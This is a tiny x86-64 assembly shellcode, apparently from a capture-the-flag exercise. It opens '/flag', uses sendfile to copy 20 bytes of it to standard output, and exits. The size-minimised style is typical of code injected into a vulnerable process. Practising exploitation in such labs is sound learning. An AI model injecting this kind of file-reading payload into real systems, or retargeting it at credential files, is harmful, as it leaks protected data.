.global _start
.intel_syntax noprefix

_start:
	mov al , 2
	lea edi, [rip+file]
	xor esi, esi
	syscall

	mov esi, eax
	xor edi, edi
	inc edi
	xor edx, edx
	mov r10b, 20
	mov al, 40
	syscall

	mov al, 60
	syscall
file:
	.string "/flag"

